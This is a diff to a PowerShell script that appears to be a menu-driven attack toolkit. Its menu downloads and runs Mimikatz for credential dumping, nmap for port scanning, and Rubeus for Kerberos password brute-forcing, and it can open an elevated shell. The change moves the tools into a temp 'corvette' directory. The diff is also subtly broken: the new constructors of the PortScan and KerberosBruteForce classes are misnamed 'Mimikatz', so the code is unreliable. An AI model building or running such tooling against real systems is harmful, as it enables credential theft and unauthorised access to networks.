@@ -27,8 +27,7 @@ function ReadAllBytes ([IO.BinaryReader] $reader) {
 }
 
 function DownloadString ([string]$url) {
-    $cli = New-Object Net.WebClient
-    return $cli.DownloadString($url)
+    return [Net.WebClient]::New().DownloadString($url)
 }
 
 function DownloadBytes ([string]$url) {
@@ -61,12 +60,20 @@ function DownloadAndExtractArchive ([string]$url, [string]$directory) {
     Remove-Item $file
 }
 
+class Properties {
+    [string]$home_dir
+
+    Properties([string]$home_dir) {
+        $this.home_dir = $home_dir
+    }
+}
+
 class Mimikatz {
     [string]$mimikatz_dir
     [string]$mimikatz_exe
 
-    Mimikatz() {
-        $this.mimikatz_dir = BuildFullPath ([IO.Path]::GetTempPath()) ".\mimikatz"
+    Mimikatz([Properties]$props) {
+        $this.mimikatz_dir = BuildFullPath $props.home_dir ".\mimikatz"
         $this.mimikatz_exe = BuildFullPath $this.mimikatz_dir "mimikatz.exe"
         $this.Prepare()
     }
@@ -87,8 +94,8 @@ class PortScan {
     [string]$nmap_dir
     [string]$nmap_exe
 
-    PortScan() {
-        $this.nmap_dir = BuildFullPath ([IO.Path]::GetTempPath()) ".\nmap"
+    Mimikatz([Properties]$props) {
+        $this.nmap_dir = BuildFullPath $props.home_dir ".\nmap"
         $this.nmap_exe = BuildFullPath $this.nmap_dir "nmap.exe"
         $this.Prepare()
     }
@@ -120,8 +127,8 @@ class KerberosBruteForce {
     [string]$rubeus_exe
     [string]$passwords_file
 
-    KerberosBruteForce() {
-        $this.rubeus_dir = BuildFullPath ([IO.Path]::GetTempPath()) ".\rubeus"
+    Mimikatz([Properties]$props) {
+        $this.rubeus_dir = BuildFullPath $props.home_dir ".\rubeus"
         $this.rubeus_exe = BuildFullPath $this.rubeus_dir "rubeus.exe"
         $this.passwords_file = BuildFullPath $this.rubeus_dir "passwords.txt"
         $this.Prepare()
@@ -145,6 +152,15 @@ class KerberosBruteForce {
 }
 
 class Menu {
+    [Properties]$props
+    
+    Menu() {
+        $home_dir = BuildFullPath ([IO.Path]::GetTempPath()) ".\corvette"
+        New-Item -ItemType Directory -Force -Path $home_dir
+
+        $this.props = [Properties]::New($home_dir)
+    }
+
     hidden [bool]LaunchCommand($cmd) {
         switch ($cmd) {
             "1" {
@@ -160,13 +176,13 @@ class Menu {
                 Start-Process -FilePath powershell.exe -verb runas
             }
             "5" {
-                (New-Object Mimikatz).Run()
+                [Mimikatz]::New($this.props).Run()
             }
             "6" {
-                (New-Object PortScan).Run()
+                [PortScan]::New($this.props).Run()
             }
             "7" {
-                (New-Object KerberosBruteForce).Run()
+                [KerberosBruteForce]::New($this.props).Run()
             }
             default {
                 return $false
@@ -195,4 +211,4 @@ class Menu {
     }
 }
 
-(New-Object Menu).OpenMenu()
+[Menu]::New().OpenMenu()
